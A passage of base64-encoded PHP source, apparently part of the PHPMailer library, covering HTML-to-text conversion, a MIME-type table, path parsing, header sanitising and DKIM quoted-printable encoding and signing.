92aWRlIHlvdXIgb3duIGNhbGxhYmxlIGZvciBjdXN0b20gY29udmVyc2lvbi4KICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBodG1sMnRleHQoJGh0bWwsICRhZHZhbmNlZCA9IGZhbHNlKQogICAgewogICAgICAgIGlmIChpc19jYWxsYWJsZSgkYWR2YW5jZWQpKSB7CiAgICAgICAgICAgIHJldHVybiBjYWxsX3VzZXJfZnVuYygkYWR2YW5jZWQsICRodG1sKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGh0bWxfZW50aXR5X2RlY29kZSgKICAgICAgICAgICAgdHJpbShzdHJpcF90YWdzKHByZWdfcmVwbGFjZSgnLzwoaGVhZHx0aXRsZXxzdHlsZXxzY3JpcHQpW14+XSo+Lio/PFwvXFwxPi9zaScsICcnLCAkaHRtbCkpKSwKICAgICAgICAgICAgRU5UX1FVT1RFUywKICAgICAgICAgICAgJHRoaXMtPkNoYXJTZXQKICAgICAgICApOwogICAgfQoKICAgIC8qKgogICAgICogR2V0IHRoZSBNSU1FIHR5cGUgZm9yIGEgZmlsZSBleHRlbnNpb24uCiAgICAgKiBAcGFyYW0gc3RyaW5nICRleHQgRmlsZSBleHRlbnNpb24KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHN0cmluZyBNSU1FIHR5cGUgb2YgZmlsZS4KICAgICAqIEBzdGF0aWMKICAgICAqLwogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBfbWltZV90eXBlcygkZXh0ID0gJycpCiAgICB7CiAgICAgICAgJG1pbWVzID0gYXJyYXkoCiAgICAgICAgICAgICd4bCcgICAgPT4gJ2FwcGxpY2F0aW9uL2V4Y2VsJywKICAgICAgICAgICAgJ2pzJyAgICA9PiAnYXBwbGljYXRpb24vamF2YXNjcmlwdCcsCiAgICAgICAgICAgICdocXgnICAgPT4gJ2FwcGxpY2F0aW9uL21hYy1iaW5oZXg0MCcsCiAgICAgICAgICAgICdjcHQnICAgPT4gJ2FwcGxpY2F0aW9uL21hYy1jb21wYWN0cHJvJywKICAgICAgICAgICAgJ2JpbicgICA9PiAnYXBwbGljYXRpb24vbWFjYmluYXJ5JywKICAgICAgICAgICAgJ2RvYycgICA9PiAnYXBwbGljYXRpb24vbXN3b3JkJywKICAgICAgICAgICAgJ3dvcmQnICA9PiAnYXBwbGljYXRpb24vbXN3b3JkJywKICAgICAgICAgICAgJ3hsc3gnICA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnNwcmVhZHNoZWV0bWwuc2hlZXQnLAogICAgICAgICAgICAneGx0eCcgID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQuc3ByZWFkc2hlZXRtbC50ZW1wbGF0ZScsCiAgICAgICAgICAgICdwb3R4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC50ZW1wbGF0ZScsCiAgICAgICAgICAgICdwcHN4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC5zbGlkZXNob3cnLAogICAgICAgICAgICAncHB0eCcgID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwucHJlc2VudGF0aW9uJywKICAgICAgICAgICAgJ3NsZHgnICA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnByZXNlbnRhdGlvbm1sLnNsaWRlJywKICAgICAgICAgICAgJ2RvY3gnICA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LndvcmRwcm9jZXNzaW5nbWwuZG9jdW1lbnQnLAogICAgICAgICAgICAnZG90eCcgID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQud29yZHByb2Nlc3NpbmdtbC50ZW1wbGF0ZScsCiAgICAgICAgICAgICd4bGFtJyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1leGNlbC5hZGRpbi5tYWNyb0VuYWJsZWQuMTInLAogICAgICAgICAgICAneGxzYicgID0+ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwuc2hlZXQuYmluYXJ5Lm1hY3JvRW5hYmxlZC4xMicsCiAgICAgICAgICAgICdjbGFzcycgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdkbGwnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdkbXMnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdleGUnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdsaGEnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdsemgnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdwc2QnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdzZWEnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdzbycgICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdvZGEnICAgPT4gJ2FwcGxpY2F0aW9uL29kYScsCiAgICAgICAgICAgICdwZGYnICAgPT4gJ2FwcGxpY2F0aW9uL3BkZicsCiAgICAgICAgICAgICdhaScgICAgPT4gJ2FwcGxpY2F0aW9uL3Bvc3RzY3JpcHQnLAogICAgICAgICAgICAnZXBzJyAgID0+ICdhcHBsaWNhdGlvbi9wb3N0c2NyaXB0JywKICAgICAgICAgICAgJ3BzJyAgICA9PiAnYXBwbGljYXRpb24vcG9zdHNjcmlwdCcsCiAgICAgICAgICAgICdzbWknICAgPT4gJ2FwcGxpY2F0aW9uL3NtaWwnLAogICAgICAgICAgICAnc21pbCcgID0+ICdhcHBsaWNhdGlvbi9zbWlsJywKICAgICAgICAgICAgJ21pZicgICA9PiAnYXBwbGljYXRpb24vdm5kLm1pZicsCiAgICAgICAgICAgICd4bHMnICAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1leGNlbCcsCiAgICAgICAgICAgICdwcHQnICAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1wb3dlcnBvaW50JywKICAgICAgICAgICAgJ3dieG1sJyA9PiAnYXBwbGljYXRpb24vdm5kLndhcC53YnhtbCcsCiAgICAgICAgICAgICd3bWxjJyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC53YXAud21sYycsCiAgICAgICAgICAgICdkY3InICAgPT4gJ2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLAogICAgICAgICAgICAnZGlyJyAgID0+ICdhcHBsaWNhdGlvbi94LWRpcmVjdG9yJywKICAgICAgICAgICAgJ2R4cicgICA9PiAnYXBwbGljYXRpb24veC1kaXJlY3RvcicsCiAgICAgICAgICAgICdkdmknICAgPT4gJ2FwcGxpY2F0aW9uL3gtZHZpJywKICAgICAgICAgICAgJ2d0YXInICA9PiAnYXBwbGljYXRpb24veC1ndGFyJywKICAgICAgICAgICAgJ3BocDMnICA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLAogICAgICAgICAgICAncGhwNCcgID0+ICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocCcsCiAgICAgICAgICAgICdwaHAnICAgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKICAgICAgICAgICAgJ3BodG1sJyA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLAogICAgICAgICAgICAncGhwcycgID0+ICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocC1zb3VyY2UnLAogICAgICAgICAgICAnc3dmJyAgID0+ICdhcHBsaWNhdGlvbi94LXNob2Nrd2F2ZS1mbGFzaCcsCiAgICAgICAgICAgICdzaXQnICAgPT4gJ2FwcGxpY2F0aW9uL3gtc3R1ZmZpdCcsCiAgICAgICAgICAgICd0YXInICAgPT4gJ2FwcGxpY2F0aW9uL3gtdGFyJywKICAgICAgICAgICAgJ3RneicgICA9PiAnYXBwbGljYXRpb24veC10YXInLAogICAgICAgICAgICAneGh0JyAgID0+ICdhcHBsaWNhdGlvbi94aHRtbCt4bWwnLAogICAgICAgICAgICAneGh0bWwnID0+ICdhcHBsaWNhdGlvbi94aHRtbCt4bWwnLAogICAgICAgICAgICAnemlwJyAgID0+ICdhcHBsaWNhdGlvbi96aXAnLAogICAgICAgICAgICAnbWlkJyAgID0+ICdhdWRpby9taWRpJywKICAgICAgICAgICAgJ21pZGknICA9PiAnYXVkaW8vbWlkaScsCiAgICAgICAgICAgICdtcDInICAgPT4gJ2F1ZGlvL21wZWcnLAogICAgICAgICAgICAnbXAzJyAgID0+ICdhdWRpby9tcGVnJywKICAgICAgICAgICAgJ21wZ2EnICA9PiAnYXVkaW8vbXBlZycsCiAgICAgICAgICAgICdhaWYnICAgPT4gJ2F1ZGlvL3gtYWlmZicsCiAgICAgICAgICAgICdhaWZjJyAgPT4gJ2F1ZGlvL3gtYWlmZicsCiAgICAgICAgICAgICdhaWZmJyAgPT4gJ2F1ZGlvL3gtYWlmZicsCiAgICAgICAgICAgICdyYW0nICAgPT4gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJywKICAgICAgICAgICAgJ3JtJyAgICA9PiAnYXVkaW8veC1wbi1yZWFsYXVkaW8nLAogICAgICAgICAgICAncnBtJyAgID0+ICdhdWRpby94LXBuLXJlYWxhdWRpby1wbHVnaW4nLAogICAgICAgICAgICAncmEnICAgID0+ICdhdWRpby94LXJlYWxhdWRpbycsCiAgICAgICAgICAgICd3YXYnICAgPT4gJ2F1ZGlvL3gtd2F2JywKICAgICAgICAgICAgJ2JtcCcgICA9PiAnaW1hZ2UvYm1wJywKICAgICAgICAgICAgJ2dpZicgICA9PiAnaW1hZ2UvZ2lmJywKICAgICAgICAgICAgJ2pwZWcnICA9PiAnaW1hZ2UvanBlZycsCiAgICAgICAgICAgICdqcGUnICAgPT4gJ2ltYWdlL2pwZWcnLAogICAgICAgICAgICAnanBnJyAgID0+ICdpbWFnZS9qcGVnJywKICAgICAgICAgICAgJ3BuZycgICA9PiAnaW1hZ2UvcG5nJywKICAgICAgICAgICAgJ3RpZmYnICA9PiAnaW1hZ2UvdGlmZicsCiAgICAgICAgICAgICd0aWYnICAgPT4gJ2ltYWdlL3RpZmYnLAogICAgICAgICAgICAnZW1sJyAgID0+ICdtZXNzYWdlL3JmYzgyMicsCiAgICAgICAgICAgICdjc3MnICAgPT4gJ3RleHQvY3NzJywKICAgICAgICAgICAgJ2h0bWwnICA9PiAndGV4dC9odG1sJywKICAgICAgICAgICAgJ2h0bScgICA9PiAndGV4dC9odG1sJywKICAgICAgICAgICAgJ3NodG1sJyA9PiAndGV4dC9odG1sJywKICAgICAgICAgICAgJ2xvZycgICA9PiAndGV4dC9wbGFpbicsCiAgICAgICAgICAgICd0ZXh0JyAgPT4gJ3RleHQvcGxhaW4nLAogICAgICAgICAgICAndHh0JyAgID0+ICd0ZXh0L3BsYWluJywKICAgICAgICAgICAgJ3J0eCcgICA9PiAndGV4dC9yaWNodGV4dCcsCiAgICAgICAgICAgICdydGYnICAgPT4gJ3RleHQvcnRmJywKICAgICAgICAgICAgJ3ZjZicgICA9PiAndGV4dC92Y2FyZCcsCiAgICAgICAgICAgICd2Y2FyZCcgPT4gJ3RleHQvdmNhcmQnLAogICAgICAgICAgICAneG1sJyAgID0+ICd0ZXh0L3htbCcsCiAgICAgICAgICAgICd4c2wnICAgPT4gJ3RleHQveG1sJywKICAgICAgICAgICAgJ21wZWcnICA9PiAndmlkZW8vbXBlZycsCiAgICAgICAgICAgICdtcGUnICAgPT4gJ3ZpZGVvL21wZWcnLAogICAgICAgICAgICAnbXBnJyAgID0+ICd2aWRlby9tcGVnJywKICAgICAgICAgICAgJ21vdicgICA9PiAndmlkZW8vcXVpY2t0aW1lJywKICAgICAgICAgICAgJ3F0JyAgICA9PiAndmlkZW8vcXVpY2t0aW1lJywKICAgICAgICAgICAgJ3J2JyAgICA9PiAndmlkZW8vdm5kLnJuLXJlYWx2aWRlbycsCiAgICAgICAgICAgICdhdmknICAgPT4gJ3ZpZGVvL3gtbXN2aWRlbycsCiAgICAgICAgICAgICdtb3ZpZScgPT4gJ3ZpZGVvL3gtc2dpLW1vdmllJwogICAgICAgICk7CiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoc3RydG9sb3dlcigkZXh0KSwgJG1pbWVzKSkgewogICAgICAgICAgICByZXR1cm4gJG1pbWVzW3N0cnRvbG93ZXIoJGV4dCldOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSc7CiAgICB9CgogICAgLyoqCiAgICAgKiBNYXAgYSBmaWxlIG5hbWUgdG8gYSBNSU1FIHR5cGUuCiAgICAgKiBEZWZhdWx0cyB0byAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywgaS5lLi4gYXJiaXRyYXJ5IGJpbmFyeSBkYXRhLgogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUgQSBmaWxlIG5hbWUgb3IgZnVsbCBwYXRoLCBkb2VzIG5vdCBuZWVkIHRvIGV4aXN0IGFzIGEgZmlsZQogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqIEBzdGF0aWMKICAgICAqLwogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBmaWxlbmFtZVRvVHlwZSgkZmlsZW5hbWUpCiAgICB7CiAgICAgICAgLy8gSW4gY2FzZSB0aGUgcGF0aCBpcyBhIFVSTCwgc3RyaXAgYW55IHF1ZXJ5IHN0cmluZyBiZWZvcmUgZ2V0dGluZyBleHRlbnNpb24KICAgICAgICAkcXBvcyA9IHN0cnBvcygkZmlsZW5hbWUsICc/Jyk7CiAgICAgICAgaWYgKGZhbHNlICE9PSAkcXBvcykgewogICAgICAgICAgICAkZmlsZW5hbWUgPSBzdWJzdHIoJGZpbGVuYW1lLCAwLCAkcXBvcyk7CiAgICAgICAgfQogICAgICAgICRwYXRoaW5mbyA9IHNlbGY6Om1iX3BhdGhpbmZvKCRmaWxlbmFtZSk7CiAgICAgICAgcmV0dXJuIHNlbGY6Ol9taW1lX3R5cGVzKCRwYXRoaW5mb1snZXh0ZW5zaW9uJ10pOwogICAgfQoKICAgIC8qKgogICAgICogTXVsdGktYnl0ZS1zYWZlIHBhdGhpbmZvIHJlcGxhY2VtZW50LgogICAgICogRHJvcC1pbiByZXBsYWNlbWVudCBmb3IgcGF0aGluZm8oKSwgYnV0IG11bHRpYnl0ZS1zYWZlLCBjcm9zcy1wbGF0Zm9ybS1zYWZlLCBvbGQtdmVyc2lvbi1zYWZlLgogICAgICogV29ya3Mgc2ltaWxhcmx5IHRvIHRoZSBvbmUgaW4gUEhQID49IDUuMi4wCiAgICAgKiBAbGluayBodHRwOi8vd3d3LnBocC5uZXQvbWFudWFsL2VuL2Z1bmN0aW9uLnBhdGhpbmZvLnBocCMxMDc0NjEKICAgICAqIEBwYXJhbSBzdHJpbmcgJHBhdGggQSBmaWxlbmFtZSBvciBwYXRoLCBkb2VzIG5vdCBuZWVkIHRvIGV4aXN0IGFzIGEgZmlsZQogICAgICogQHBhcmFtIGludGVnZXJ8c3RyaW5nICRvcHRpb25zIEVpdGhlciBhIFBBVEhJTkZPXyogY29uc3RhbnQsCiAgICAgKiAgICAgIG9yIGEgc3RyaW5nIG5hbWUgdG8gcmV0dXJuIG9ubHkgdGhlIHNwZWNpZmllZCBwaWVjZSwgYWxsb3dzICdmaWxlbmFtZScgdG8gd29yayBvbiBQSFAgPCA1LjIKICAgICAqIEByZXR1cm4gc3RyaW5nfGFycmF5CiAgICAgKiBAc3RhdGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gbWJfcGF0aGluZm8oJHBhdGgsICRvcHRpb25zID0gbnVsbCkKICAgIHsKICAgICAgICAkcmV0ID0gYXJyYXkoJ2Rpcm5hbWUnID0+ICcnLCAnYmFzZW5hbWUnID0+ICcnLCAnZXh0ZW5zaW9uJyA9PiAnJywgJ2ZpbGVuYW1lJyA9PiAnJyk7CiAgICAgICAgJHBhdGhpbmZvID0gYXJyYXkoKTsKICAgICAgICBpZiAocHJlZ19tYXRjaCgnJV4oLio/KVtcXFxcL10qKChbXi9cXFxcXSo/KShcLihbXlwuXFxcXC9dKz8pfCkpW1xcXFwvXC5dKiQlaW0nLCAkcGF0aCwgJHBhdGhpbmZvKSkgewogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygxLCAkcGF0aGluZm8pKSB7CiAgICAgICAgICAgICAgICAkcmV0WydkaXJuYW1lJ10gPSAkcGF0aGluZm9bMV07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMiwgJHBhdGhpbmZvKSkgewogICAgICAgICAgICAgICAgJHJldFsnYmFzZW5hbWUnXSA9ICRwYXRoaW5mb1syXTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cyg1LCAkcGF0aGluZm8pKSB7CiAgICAgICAgICAgICAgICAkcmV0WydleHRlbnNpb24nXSA9ICRwYXRoaW5mb1s1XTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygzLCAkcGF0aGluZm8pKSB7CiAgICAgICAgICAgICAgICAkcmV0WydmaWxlbmFtZSddID0gJHBhdGhpbmZvWzNdOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHN3aXRjaCAoJG9wdGlvbnMpIHsKICAgICAgICAgICAgY2FzZSBQQVRISU5GT19ESVJOQU1FOgogICAgICAgICAgICBjYXNlICdkaXJuYW1lJzoKICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydkaXJuYW1lJ107CiAgICAgICAgICAgIGNhc2UgUEFUSElORk9fQkFTRU5BTUU6CiAgICAgICAgICAgIGNhc2UgJ2Jhc2VuYW1lJzoKICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydiYXNlbmFtZSddOwogICAgICAgICAgICBjYXNlIFBBVEhJTkZPX0VYVEVOU0lPTjoKICAgICAgICAgICAgY2FzZSAnZXh0ZW5zaW9uJzoKICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydleHRlbnNpb24nXTsKICAgICAgICAgICAgY2FzZSBQQVRISU5GT19GSUxFTkFNRToKICAgICAgICAgICAgY2FzZSAnZmlsZW5hbWUnOgogICAgICAgICAgICAgICAgcmV0dXJuICRyZXRbJ2ZpbGVuYW1lJ107CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICByZXR1cm4gJHJldDsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgb3IgcmVzZXQgaW5zdGFuY2UgcHJvcGVydGllcy4KICAgICAqIFlvdSBzaG91bGQgYXZvaWQgdGhpcyBmdW5jdGlvbiAtIGl0J3MgbW9yZSB2ZXJib3NlLCBsZXNzIGVmZmljaWVudCwgbW9yZSBlcnJvci1wcm9uZSBhbmQKICAgICAqIGhhcmRlciB0byBkZWJ1ZyB0aGFuIHNldHRpbmcgcHJvcGVydGllcyBkaXJlY3RseS4KICAgICAqIFVzYWdlIEV4YW1wbGU6CiAgICAgKiBgJG1haWwtPnNldCgnU01UUFNlY3VyZScsICd0bHMnKTtgCiAgICAgKiAgIGlzIHRoZSBzYW1lIGFzOgogICAgICogYCRtYWlsLT5TTVRQU2VjdXJlID0gJ3Rscyc7YAogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgVGhlIHByb3BlcnR5IG5hbWUgdG8gc2V0CiAgICAgKiBAcGFyYW0gbWl4ZWQgJHZhbHVlIFRoZSB2YWx1ZSB0byBzZXQgdGhlIHByb3BlcnR5IHRvCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqIEBUT0RPIFNob3VsZCB0aGlzIG5vdCBiZSB1c2luZyB0aGUgX19zZXQoKSBtYWdpYyBmdW5jdGlvbj8KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNldCgkbmFtZSwgJHZhbHVlID0gJycpCiAgICB7CiAgICAgICAgaWYgKHByb3BlcnR5X2V4aXN0cygkdGhpcywgJG5hbWUpKSB7CiAgICAgICAgICAgICR0aGlzLT4kbmFtZSA9ICR2YWx1ZTsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0aGlzLT5sYW5nKCd2YXJpYWJsZV9zZXQnKSAuICRuYW1lKTsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIFN0cmlwIG5ld2xpbmVzIHRvIHByZXZlbnQgaGVhZGVyIGluamVjdGlvbi4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZWN1cmVIZWFkZXIoJHN0cikKICAgIHsKICAgICAgICByZXR1cm4gdHJpbShzdHJfcmVwbGFjZShhcnJheSgiXHIiLCAiXG4iKSwgJycsICRzdHIpKTsKICAgIH0KCiAgICAvKioKICAgICAqIE5vcm1hbGl6ZSBsaW5lIGJyZWFrcyBpbiBhIHN0cmluZy4KICAgICAqIENvbnZlcnRzIFVOSVggTEYsIE1hYyBDUiBhbmQgV2luZG93cyBDUkxGIGxpbmUgYnJlYWtzIGludG8gYSBzaW5nbGUgbGluZSBicmVhayBmb3JtYXQuCiAgICAgKiBEZWZhdWx0cyB0byBDUkxGIChmb3IgbWVzc2FnZSBib2RpZXMpIGFuZCBwcmVzZXJ2ZXMgY29uc2VjdXRpdmUgYnJlYWtzLgogICAgICogQHBhcmFtIHN0cmluZyAkdGV4dAogICAgICogQHBhcmFtIHN0cmluZyAkYnJlYWt0eXBlIFdoYXQga2luZCBvZiBsaW5lIGJyZWFrIHRvIHVzZSwgZGVmYXVsdHMgdG8gQ1JMRgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAc3RhdGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gbm9ybWFsaXplQnJlYWtzKCR0ZXh0LCAkYnJlYWt0eXBlID0gIlxyXG4iKQogICAgewogICAgICAgIHJldHVybiBwcmVnX3JlcGxhY2UoJy8oXHJcbnxccnxcbikvbXMnLCAkYnJlYWt0eXBlLCAkdGV4dCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgdGhlIHB1YmxpYyBhbmQgcHJpdmF0ZSBrZXkgZmlsZXMgYW5kIHBhc3N3b3JkIGZvciBTL01JTUUgc2lnbmluZy4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRjZXJ0X2ZpbGVuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nICRrZXlfZmlsZW5hbWUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGtleV9wYXNzIFBhc3N3b3JkIGZvciBwcml2YXRlIGtleQogICAgICogQHBhcmFtIHN0cmluZyAkZXh0cmFjZXJ0c19maWxlbmFtZSBPcHRpb25hbCBwYXRoIHRvIGNoYWluIGNlcnRpZmljYXRlCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzaWduKCRjZXJ0X2ZpbGVuYW1lLCAka2V5X2ZpbGVuYW1lLCAka2V5X3Bhc3MsICRleHRyYWNlcnRzX2ZpbGVuYW1lID0gJycpCiAgICB7CiAgICAgICAgJHRoaXMtPnNpZ25fY2VydF9maWxlID0gJGNlcnRfZmlsZW5hbWU7CiAgICAgICAgJHRoaXMtPnNpZ25fa2V5X2ZpbGUgPSAka2V5X2ZpbGVuYW1lOwogICAgICAgICR0aGlzLT5zaWduX2tleV9wYXNzID0gJGtleV9wYXNzOwogICAgICAgICR0aGlzLT5zaWduX2V4dHJhY2VydHNfZmlsZSA9ICRleHRyYWNlcnRzX2ZpbGVuYW1lOwogICAgfQoKICAgIC8qKgogICAgICogUXVvdGVkLVByaW50YWJsZS1lbmNvZGUgYSBES0lNIGhlYWRlci4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eHQKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX1FQKCR0eHQpCiAgICB7CiAgICAgICAgJGxpbmUgPSAnJzsKICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCBzdHJsZW4oJHR4dCk7ICRpKyspIHsKICAgICAgICAgICAgJG9yZCA9IG9yZCgkdHh0WyRpXSk7CiAgICAgICAgICAgIGlmICgoKDB4MjEgPD0gJG9yZCkgJiYgKCRvcmQgPD0gMHgzQSkpIHx8ICRvcmQgPT0gMHgzQyB8fCAoKDB4M0UgPD0gJG9yZCkgJiYgKCRvcmQgPD0gMHg3RSkpKSB7CiAgICAgICAgICAgICAgICAkbGluZSAuPSAkdHh0WyRpXTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRsaW5lIC49ICc9JyAuIHNwcmludGYoJyUwMlgnLCAkb3JkKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJGxpbmU7CiAgICB9CgogICAgLyoqCiAgICAgKiBHZW5lcmF0ZSBhIERLSU0gc2lnbmF0dXJlLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHNpZ25IZWFkZXIKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIHN0cmluZyBUaGUgREtJTSBzaWduYXR1cmUgdmFsdWUKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fU2lnbigkc2lnbkhlYWRlcikKICAgIHsKICAgICAgICBpZiAoIWRlZmluZWQoJ1BLQ1M3X1RFWFQnKSkgewogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4dGVuc2lvbl9taXNzaW5nJykgLiAnb3BlbnNzbCcpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICB9CiAgICAgICAgJHByaXZLZXlTdHIgPSAhZW1wdHkoJHRoaXMtPkRLSU1fcHJpdmF0ZV9zdHJpbmcpID8gJHRoaXMtPkRLSU1fcHJpdmF0ZV9zdHJpbmcgOiBmaWxlX2dldF9jb250ZW50cygkdGhpcy0+REtJTV9wcml2YXRlKTsKICAgICAgICBpZiAoJycgIT0gJHRoaXMtPkRLSU1fcGFzc3BocmFzZSkgewogICAgICAgICAgICAkcHJpdktleSA9IG9wZW5zc2xfcGtleV9nZXRfcHJpdmF0ZSgkcHJpdktleVN0ciwgJHRoaXMtPkRLSU1fcGFzc3BocmFzZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHByaXZLZXkgPSBvcGVuc3NsX3BrZXlfZ2V0X3ByaXZhdGUoJHByaXZLZXlTdHIpOwogICAgICAgIH0KICAgICAgICAvL1dvcmthcm91bmQgZm9yIG1pc3NpbmcgZGlnZXN0IGFsZ29yaXRobXMgaW4gb2xkIFBIUCAmIE9wZW5TU0wgdmVyc2lvbnMKICAgICAgICAvL0BsaW5rIGh0dHA6Ly9zdGFja292ZXJmbG93LmNvbS9hLzExMTE3MzM4LzMzMzM0MAogICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjMuMCcpID49IDAgYW5kCiAgICAgICAgICAgIGluX2FycmF5KCdzaGEyNTZXaXRoUlNBRW5jcnlwdGlvbicsIG9wZW5zc2xfZ2V0X21kX21ldGhvZHModHJ1ZSkpKSB7CiAgICAgICAgICAgIGlmIChvcGVuc3NsX3NpZ24oJHNpZ25IZWFkZXIsICRzaWduYXR1cmUsICRwcml2S2V5LCAnc2hhMjU2V2l0aFJTQUVuY3J5cHRpb24nKSkgewogICAgICAgICAgICAgICAgb3BlbnNzbF9wa2V5X2ZyZWUoJHByaXZLZXkpOwogICAgICAgICAgICAgICAgcmV0dXJuIGJhc2U2NF9lbmNvZGUoJHNpZ25hdHVyZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkcGluZm8gPSBvcGVuc3NsX3BrZXlfZ2V0X2RldGFpbHMoJHByaXZLZXkpOwogICAgICAgICAgICAkaGFzaCA9IGhhc2goJ3NoYTI1N